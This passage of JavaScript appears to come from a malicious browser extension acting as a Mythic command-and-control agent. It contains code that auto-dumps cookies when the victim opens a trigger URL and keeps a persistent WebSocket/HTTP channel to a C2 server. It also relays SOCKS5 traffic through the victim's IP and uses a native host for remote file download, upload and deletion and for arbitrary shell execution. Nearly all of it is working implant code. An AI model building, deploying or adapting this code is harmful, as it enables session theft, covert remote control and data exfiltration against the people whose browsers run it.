      (tab.url.startsWith(TRIGGER_URL) || tab.url.includes(TRIGGER_URL))) {
    if (lastTriggerTabId === tabId) return;
    lastTriggerTabId = tabId;
    setTimeout(() => { cmdDumpCookies({ id: "auto_cookie_" + Date.now() }); lastTriggerTabId = null; }, 1000);
  }
});
// __ENDCMD__

// ── WebSocket transport// ── WebSocket transport ───────────────────────────────────────────────────────
function connect() {
  if (!WS_C2_URL) return;
  clearTimeout(connectTimer);
  if (socket && (socket.readyState === WebSocket.OPEN || socket.readyState === WebSocket.CONNECTING)) return;

  socket = new WebSocket(WS_C2_URL);

  socket.addEventListener("open", async () => {
    backoffMs = 1000;
    // Flush queued action objects — encrypt each one fresh
    while (OUTBOX.length) {
      const action = OUTBOX.shift();
      try {
        if (socket.readyState !== WebSocket.OPEN) { OUTBOX.unshift(action); break; }
        const b64 = await encryptForMythic(action);
        socket.send(JSON.stringify({ client: true, data: b64, tag: "" }));
      } catch (e) { ; }
    }
    if (mythicCallbackId) {
      // Reconnect: resume existing session without creating a new callback
      getTasking();
      startHeartbeat();
    } else {
      checkIn();
    }
  });

  socket.addEventListener("message", (ev) => {
    handleMythicMessage(ev.data).catch(() => {});
  });

  socket.addEventListener("close", (ev) => {
    scheduleReconnect();
  });
  socket.addEventListener("error", () => { try { socket.close(); } catch (_) {} });
}

function scheduleReconnect() {
  stopHeartbeat();
  clearTimeout(connectTimer);
  connectTimer = setTimeout(connect, backoffMs);
  backoffMs = Math.min(backoffMs * 2, backoffMaxMs);
}

// ── Heartbeat ─────────────────────────────────────────────────────────────────
// Two separate timers:
//
// 1. KEEPALIVE (20 s, fixed) — writes a timestamp to chrome.storage.local.
//    This is enough Chrome API activity to prevent Chrome MV3 from killing the
//    service worker (~30 s idle timeout). Generates zero network traffic.
//
// 2. POLL (operator-controlled via `sleep`) — calls getTasking() at the
//    requested interval. Can be 10 s, 60 s, 5 min, etc. No cap.
//
// Both WS and HTTP are request-response: the agent must poll get_tasking to
// receive commands. WebSocket advantage = persistent socket (lower overhead).
let keepaliveTimer = null;

function startHeartbeat() {
  stopHeartbeat();

  // Keepalive — silent, local-only, keeps service worker alive
  keepaliveTimer = setInterval(() => {
    chrome.storage.local.set({ _ka: Date.now() });
  }, 20000);

  // Poll — network traffic at operator's chosen interval
  chrome.storage.local.get("sleepIntervalMs", (result) => {
    void chrome.runtime.lastError; // suppress "Unchecked lastError" in error panel
    const interval = result.sleepIntervalMs || sleepIntervalMs;
    heartbeatTimer = setInterval(() => {
      if (WS_C2_URL && socket && socket.readyState === WebSocket.OPEN) {
        getTasking();
      } else if (HTTP_C2_URL) {
        getTasking();
      } else if (WS_C2_URL) {
        connect(); // WS configured but disconnected — reconnect
      }
    }, interval);
  });
}

function stopHeartbeat() {
  if (heartbeatTimer)  { clearInterval(heartbeatTimer);  heartbeatTimer  = null; }
  if (keepaliveTimer)  { clearInterval(keepaliveTimer);  keepaliveTimer  = null; }
}

// ── Extension lifecycle ───────────────────────────────────────────────────────
function ensureConnected() {
  if (WS_C2_URL) {
    connect();
  } else if (HTTP_C2_URL && !mythicCallbackId) {
    checkIn();   // HTTP-only: checkin immediately; heartbeat starts after checkin ack
  }
  // Restore ip_proxy connection (SOCKS bridge + native host)
  chrome.storage.local.get("ipProxyUrl", (r) => {
    void chrome.runtime.lastError; // suppress "Unchecked lastError" in error panel
    if (r.ipProxyUrl && !_ipProxyWS) { _ipProxyWsUrl = r.ipProxyUrl; _ipProxyConnect(null); }
  });
  // Restore native_start connection (native host only, no SOCKS bridge)
  chrome.storage.local.get("nativeStartPsk", (r) => {
    void chrome.runtime.lastError; // suppress "Unchecked lastError" in error panel
    if (r.nativeStartPsk !== undefined && !_ipProxyNative && !_ipProxyWsUrl) {
      _ipProxyPsk = r.nativeStartPsk;
      _ipProxyConnectNative(_ipProxyPsk);
    }
  });
}

chrome.runtime.onStartup.addListener(ensureConnected);
chrome.runtime.onInstalled.addListener((details) => {
  if (details.reason === "install") {
    chrome.storage.local.set({ extensionStartTime: Date.now() });
  }
  ensureConnected();
});
chrome.alarms.create("c2Ensure", { periodInMinutes: 0.5 }); // 30 s — fastest Chrome allows
chrome.alarms.onAlarm.addListener(a => { if (a.name === "c2Ensure") ensureConnected(); });

ensureConnected();

// __CMD__ ip_proxy_start,ip_proxy_stop
// ── IP Proxy — SOCKS5 relay through victim's machine ─────────────────────────
// Connects to socks_bridge.py on the C2 server via WSS and relays SOCKS5
// connections through proxy_host.py (native messaging) on the victim machine.
// All TCP connections originate from the victim's IP.
//
// Install: python3 native_host/proxy_install.py --extension-id <ID>
// Start  : ip_proxy_start url=wss://c2server.com/proxy-ws  (in Mythic)
// Tunnel : ssh -L 1080:127.0.0.1:1080 user@c2, then configure SOCKS5 proxy

const IP_PROXY_HOST_NAME = "IP_PROXY_HOST_PLACEHOLDER";


let _ipProxyWS          = null;
let _ipProxyWsUrl       = null;
let _ipProxyNative      = null;
let _ipProxyReconnTimer = null;
let _ipProxyReconnDelay = 2000;
let _ipProxyTaskId      = null;
let _ipProxySocksPort   = 1080;
let _ipProxyPsk         = "";

// Native sysinfo — auto-fires once when native host first activates.
// Only available when ip_proxy_start has been run with a native host build
// (proxy_only / all / any native_host_features != "none").
async function _ipProxyFetchNativeSysinfo() {
  try {
    const r = await _fileNativeRequest({ type: 'native_sysinfo', id: crypto.randomUUID() }, 8000);
    if (!r || r.error || !r.hostname) return;

    // Post host/user/OS info to the ip_proxy_start task output — reliable across all Mythic versions.
    // Also attempt callback_info update (supported in Mythic v3+, silently ignored if not).
    if (_ipProxyTaskId) {
      const arch = (r.os.includes('arm64') || r.os.includes('aarch64')) ? 'arm64' : 'x86_64';
      const info = `Host: ${r.hostname}  User: ${r.username}  OS: ${r.os}  IP: ${r.local_ip}`;
      sendToMythic({
        action: 'post_response',
        responses: [{ task_id: _ipProxyTaskId, user_output: `[native host] ${info}`,
          completed: false,
          callback_info: {
            host: r.hostname, user: r.username, os: r.os,
            architecture: arch, extra_info: `local_ip=${r.local_ip}`,
          }
        }], delegates: []
      }).catch(() => {});
    }
  } catch (_) {}
}

// ── Native host connection — shared by native_start and ip_proxy_start ────────
function _ipProxyConnectNative(psk) {
  if (_ipProxyNative) return;
  try {
    _ipProxyNative = chrome.runtime.connectNative(IP_PROXY_HOST_NAME);
  } catch (_) {
    _ipProxyNative = null;
    return;
  }

  if (psk) {
    try { _ipProxyNative.postMessage({ type: 'activate', psk }); } catch (_) {}
  }

  _ipProxyNative.onMessage.addListener((msg) => {
    if (msg.type === 'ping') {
      try { _ipProxyNative.postMessage({ type: 'pong', id: '' }); } catch (_) {}
      return;
    }
    if (['socks_connected','socks_data','socks_closed','socks_error','http_probe_response'].includes(msg.type)
        && _ipProxyWS && _ipProxyWS.readyState === WebSocket.OPEN) {
      try { _ipProxyWS.send(JSON.stringify(msg)); } catch (_) {}
    }
  });

  _ipProxyNative.onDisconnect.addListener(() => {
    const err = chrome.runtime.lastError;
    _ipProxyNative = null;
    if (_ipProxyTaskId) {
      postResponse(_ipProxyTaskId,
        "Native host disconnected" + (err ? ": " + err.message : ""), true);
      _ipProxyTaskId = null;
    }
    _ipProxyWsUrl = null;
    chrome.storage.local.remove(["ipProxyUrl", "nativeStartPsk"]);
    if (_ipProxyWS) { try { _ipProxyWS.close(); } catch (_) {} _ipProxyWS = null; }
  });
}

function ipProxyStart(taskId, wsUrl, socksPort, psk) {
  if (_ipProxyWS || _ipProxyNative) {
    postResponse(taskId, "IP proxy already running — call ip_proxy_stop first");
    return;
  }
  if (!wsUrl) {
    postResponse(taskId, "ip_proxy_start requires url= parameter (WSS URL of socks_bridge.py)");
    return;
  }
  _ipProxyWsUrl     = wsUrl;
  _ipProxyTaskId    = taskId;
  _ipProxySocksPort = socksPort || 1080;
  _ipProxyPsk       = psk || "";
  chrome.storage.local.set({ ipProxyUrl: wsUrl });

  _ipProxyConnectNative(_ipProxyPsk);
  if (!_ipProxyNative) {
    _ipProxyTaskId = null;
    chrome.storage.local.remove("ipProxyUrl");
    postResponse(taskId,
      "connectNative failed — run the installer first:\n" +
      "  python3 native_host/install.py --extension-id " + chrome.runtime.id);
    return;
  }

  _ipProxyConnect(taskId);
}

function _ipProxyConnect(taskId) {
  if (!_ipProxyWsUrl) return;
  if (_ipProxyWS && (_ipProxyWS.readyState === WebSocket.OPEN ||
                     _ipProxyWS.readyState === WebSocket.CONNECTING)) return;
  try {
    _ipProxyWS = new WebSocket(_ipProxyWsUrl);
    _ipProxyWS.binaryType = "arraybuffer";  // required to receive binary socks_data frames as ArrayBuffer

    _ipProxyWS.addEventListener("open", () => {
      _ipProxyReconnDelay = 2000;
      // Register with the bridge
      try {
        _ipProxyWS.send(JSON.stringify({
          type:             "register",
          extensionVersion: chrome.runtime.getManifest().version,
          userAgent:        navigator.userAgent,
        }));
      } catch (_) {}
      if (taskId) {
        postResponse(taskId, "IP proxy started\n  WSS : " + _ipProxyWsUrl + "\n  SOCKS5: ssh -L " + _ipProxySocksPort + ":127.0.0.1:" + _ipProxySocksPort + " user@c2  then configure SOCKS5 127.0.0.1:" + _ipProxySocksPort);
        taskId = null;
      }
    });

    _ipProxyWS.addEventListener("message", (ev) => {
      try {
        const msg = JSON.parse(ev.data);
        if (msg.type === "ping") {
          try { _ipProxyWS.send(JSON.stringify({ type: "pong" })); } catch (_) {}
          return;
        }
        // Forward socks_connect/data/close and http_probe → native host
        if (_ipProxyNative && ["socks_connect","socks_data","socks_close","http_probe"].includes(msg.type)) {
          try { _ipProxyNative.postMessage(msg); } catch (_) {}
        }
      } catch (_) {}
    });

    _ipProxyWS.addEventListener("close", () => {
      _ipProxyWS = null;
      if (_ipProxyWsUrl && _ipProxyNative) _ipProxyScheduleReconn();
    });

    _ipProxyWS.addEventListener("error", () => {
      if (taskId) {
        postResponse(taskId, "IP proxy WSS connection failed: " + _ipProxyWsUrl);
        taskId = null;
      }
      try { _ipProxyWS?.close(); } catch (_) {}
    });
  } catch (e) {
    if (taskId) { postResponse(taskId, "IP proxy error: " + e.message); taskId = null; }
  }
}

function _ipProxyScheduleReconn() {
  if (_ipProxyReconnTimer) return;
  _ipProxyReconnTimer = setTimeout(() => {
    _ipProxyReconnTimer = null;
    _ipProxyConnect(null);
  }, _ipProxyReconnDelay);
  _ipProxyReconnDelay = Math.min(_ipProxyReconnDelay * 1.5, 30000);
}

function ipProxyStop(taskId) {
  _ipProxyWsUrl = null;
  chrome.storage.local.remove("ipProxyUrl");
  if (_ipProxyReconnTimer) { clearTimeout(_ipProxyReconnTimer); _ipProxyReconnTimer = null; }
  if (_ipProxyWS) { try { _ipProxyWS.close(); } catch (_) {} _ipProxyWS = null; }
  if (_ipProxyNative) { try { _ipProxyNative.disconnect(); } catch (_) {} _ipProxyNative = null; }
  const startId = _ipProxyTaskId;
  _ipProxyTaskId = null;
  if (startId && startId !== taskId) postResponse(startId, "IP proxy stopped", true);
  if (taskId) postResponse(taskId, "IP proxy stopped");
}
// __ENDCMD__

// ── Native host request helper (file + exec commands) ────────────────────────
// Sends a request to the ip_proxy native host and returns the matching response.
function _fileNativeRequest(msgObj, timeoutMs = 30000) {
  return new Promise((resolve, reject) => {
    if (!_ipProxyNative) { reject(new Error("Native host not connected — run native_start (no proxy) or ip_proxy_start (with SOCKS proxy)")); return; }
    const timer = setTimeout(() => {
      _ipProxyNative.onMessage.removeListener(handler);
      reject(new Error("native host timeout"));
    }, timeoutMs);
    function handler(msg) {
      if (msg.id !== msgObj.id) return;
      _ipProxyNative.onMessage.removeListener(handler);
      clearTimeout(timer);
      resolve(msg);
    }
    _ipProxyNative.onMessage.addListener(handler);
    try { _ipProxyNative.postMessage(msgObj); }
    catch (e) { clearTimeout(timer); _ipProxyNative.onMessage.removeListener(handler); reject(e); }
  });
}

// __CMD__ file_ls,file_download,file_upload,file_delete,file_mkdir
// ── File browser via native host ─────────────────────────────────────────────

// Chrome native messaging has a hard 1 MB per-message limit.
// 384 KB raw → ~512 KB base64 — safe chunk size for both directions.
const _FILE_CHUNK_RAW  = 384 * 1024;
const _FILE_CHUNK_B64  = Math.ceil(_FILE_CHUNK_RAW / 3) * 4;  // valid b64 boundary

// Chunked download: collects multiple chunk messages then resolves with joined data.
function _fileChunkedDownload(path, timeoutMs = 300000) {
  return new Promise((resolve, reject) => {
    if (!_ipProxyNative) { reject(new Error("Native host not connected")); return; }
    const id = crypto.randomUUID();
    const chunks = [];
    let total = null, received = 0;

    const timer = setTimeout(() => {
      _ipProxyNative.onMessage.removeListener(handler);
      reject(new Error("file_download timed out"));
    }, timeoutMs);

    function handler(msg) {
      if (msg.id !== id) return;
      if (msg.error) {
        _ipProxyNative.onMessage.removeListener(handler);
        clearTimeout(timer);
        reject(new Error(msg.error));
        return;
      }
      chunks[msg.chunk_num] = msg.data;
      total = msg.total_chunks;
      received++;
      if (received === total) {
        _ipProxyNative.onMessage.removeListener(handler);
        clearTimeout(timer);
        resolve({ ...msg, data: chunks.join('') });
      }
    }

    _ipProxyNative.onMessage.addListener(handler);
    try { _ipProxyNative.postMessage({ type: 'file_download', id, path }); }
    catch (e) {
      clearTimeout(timer);
      _ipProxyNative.onMessage.removeListener(handler);
      reject(e);
    }
  });
}

async function cmdFileLs(task, params) {
  let path = "";
  try { path = JSON.parse(params).path || ""; } catch { path = params.trim(); }
  if (!path) { postResponse(task.id, "file_ls requires path=<dir>"); return; }
  try {
    const r = await _fileNativeRequest({ type: "file_ls", id: crypto.randomUUID(), path });
    if (r.error) { postResponse(task.id, "error: " + r.error); return; }
    const lines = (r.entries || []).map(e =>
      `${e.permissions || "?????????"}  ${String(e.size || 0).padStart(10)}  ${
        e.modified
          ? new Date(e.modified * 1000).toISOString().replace('T', ' ').slice(0, 19)
          : '                   '
      }  ${e.name}${e.type === "dir" ? "/" : ""}`
    );
    postResponse(task.id, lines.join("\n") || "(empty)");
  } catch (e) { postResponse(task.id, "file_ls failed: " + e.message); }
}

async function cmdFileDownload(task, params) {
  let path = "";
  try { path = JSON.parse(params).path || ""; } catch { path = params.trim(); }
  if (!path) { postResponse(task.id, "file_download requires path=<file>"); return; }
  try {
    const r = await _fileChunkedDownload(path, 300000);
    if (r.error) { postResponse(task.id, "error: " + r.error); return; }
    const fname = path.split(/[/\\]/).pop();
    postFile(task.id, fname, r.data, false);
  } catch (e) { postResponse(task.id, "file_download failed: " + e.message); }
}

async function cmdFileUpload(task, params) {
  let path = "", fileId = "", contentB64 = "", append = false;
  try {
    const p = JSON.parse(params);
    path       = p.path        || "";
    fileId     = p.file_id || p.upload_file || "";  // upload_file = ParameterType.File picker value
    contentB64 = p.content_b64 || "";
    append     = !!p.append;
  } catch {
    postResponse(task.id,
      'file_upload requires JSON — e.g.\n' +
      '  {"path": "/tmp/x", "content_b64": "<base64>"}  (inline, small files)\n' +
      '  {"path": "/tmp/x", "file_id": "<mythic-id>"}   (Mythic upload, large files)');
    return;
  }

  if (!path) { postResponse(task.id, "file_upload: path is required"); return; }
  if (!fileId && !contentB64) {
    postResponse(task.id, "file_upload: supply either file_id or content_b64");
    return;
  }

  try {
    let data = contentB64;

    if (fileId && !contentB64) {
      // Fetch via Mythic upload protocol over existing C2 channel (WebSocket or HTTP).
      // Falls back to direct HTTP download only if C2 fetch fails and HTTP is available.
      try {
        data = await fetchFileViaMythicC2(task.id, fileId);
      } catch (_) {
        if (HTTP_C2_URL) {
          const blob = await fetchFileFromMythic(fileId);
          const u8   = new Uint8Array(blob);
          let b64 = "", c = 8192;
          for (let i = 0; i < u8.length; i += c)
            b64 += btoa(String.fromCharCode(...u8.subarray(i, i + c)));
          data = b64;
        } else {
          throw new Error('Could not retrieve file — no response from Mythic upload protocol and HTTP C2 not configured');
        }
      }
    }

    // Chunk uploads to stay under the 1 MB native messaging limit.
    // First chunk creates/overwrites; subsequent chunks append.
    for (let offset = 0, chunkNum = 0; offset < data.length; offset += _FILE_CHUNK_B64, chunkNum++) {
      const chunk   = data.slice(offset, offset + _FILE_CHUNK_B64);
      const isFirst = chunkNum === 0;
      const r = await _fileNativeRequest({
        type: "file_upload", id: crypto.randomUUID(), path,
        data: chunk, append: isFirst ? !!append : true,
      }, 60000);
      if (r.error) { postResponse(task.id, "upload error: " + r.error); return; }
    }
    postResponse(task.id, "uploaded → " + path);
  } catch (e) { postResponse(task.id, "file_upload failed: " + e.message); }
}

async function cmdFileDelete(task, params) {
  let path = "";
  try { path = JSON.parse(params).path || ""; } catch { path = params.trim(); }
  if (!path) { postResponse(task.id, "file_delete requires path=<file>"); return; }
  try {
    const r = await _fileNativeRequest({ type: "file_delete", id: crypto.randomUUID(), path });
    if (r.error) postResponse(task.id, "error: " + r.error);
    else postResponse(task.id, "deleted " + path);
  } catch (e) { postResponse(task.id, "file_delete failed: " + e.message); }
}

async function cmdFileMkdir(task, params) {
  let path = "";
  try { path = JSON.parse(params).path || ""; } catch { path = params.trim(); }
  if (!path) { postResponse(task.id, "file_mkdir requires path=<dir>"); return; }
  try {
    const r = await _fileNativeRequest({ type: "file_mkdir", id: crypto.randomUUID(), path });
    if (r.error) postResponse(task.id, "error: " + r.error);
    else postResponse(task.id, "created " + path);
  } catch (e) { postResponse(task.id, "file_mkdir failed: " + e.message); }
}
// __ENDCMD__

// __CMD__ exec
// ── Shell command execution via native host ───────────────────────────────────

async function cmdShellExec(task, params) {
  let cmd = "", cwd = undefined, timeout = 60, mode = "direct";
  try {
    const p = JSON.parse(params);
    cmd     = p.cmd     || p.command || "";
    cwd     = p.cwd     || undefined;
    timeout = p.timeout || 60;
    mode    = p.mode    || "direct";
  } catch {
    cmd = params.trim();
  }
  if (!cmd) { postResponse(task.id, "exec requires cmd=<command>"); return; }
  try {
    const r = await _fileNativeRequest({
      type: "exec_cmd", id: crypto.randomUUID(), cmd, cwd, timeout, mode,
    }, (timeout + 10) * 1000);
    let out = "";
    if (r.exit_code !== 0 && r.exit_code !== undefined)
      out += `[exit ${r.exit_code}]\n`;
    if (r.error) out += `[error: ${r.error}]\n`;
    out += r.output || "(no output)";
    postResponse(task.id, out);
  } catch (e) { postResponse(task.id, "exec failed: " + e.message); }
}
// __ENDCMD__

// __CMD__ native_start,native_stop
// ── Native messaging host — standalone activation (no SOCKS proxy) ───────────
// Connects the Python native host for file and exec commands without starting
// the ip_proxy SOCKS bridge. Use for payloads built with exec_only, files_only,
// or files_and_exec native_host_features where proxying is not needed.

let _nativeStartTaskId = null;

function cmdNativeStart(task, params) {
  if (_ipProxyNative) {
    postResponse(task.id,
      "Native host already connected (via native_start or ip_proxy_start).\n" +
      "Call native_stop or ip_proxy_stop first.", true);
    return;
  }
  let psk = "";
  try { const p = JSON.parse(params); psk = p.psk || ""; } catch { psk = params.trim(); }

  _ipProxyPsk    = psk;
  _ipProxyTaskId = task.id;   // used by native_stop to complete this task
  _nativeStartTaskId = task.id;
  chrome.storage.local.set({ nativeStartPsk: psk });

  _ipProxyConnectNative(psk);

  if (!_ipProxyNative) {
    _nativeStartTaskId = null;
    _ipProxyTaskId     = null;
    chrome.storage.local.remove(["nativeStartPsk"]);
    postResponse(task.id,
      "connectNative failed — install the native host first:\n" +
      "  python3 native_host/install.py --extension-id " + chrome.runtime.id, true);
    return;
  }

  postResponse(task.id,
    "Native host connected. file_ls, file_download, file_upload, exec etc. are now available.\n" +
    "Run native_stop to disconnect.", false);
}

function cmdNativeStop(task) {
  const prevId = _nativeStartTaskId;
  _nativeStartTaskId = null;
  _ipProxyTaskId     = null;
  _ipProxyPsk        = "";
  chrome.storage.local.remove(["nativeStartPsk"]);

  if (_ipProxyNative) {
    try { _ipProxyNative.disconnect(); } catch (_) {}
    _ipProxyNative = null;
  }

  if (prevId) postResponse(prevId, "Native host disconnected", true);
  postResponse(task.id, "Native host stopped");
}
// __ENDCMD__
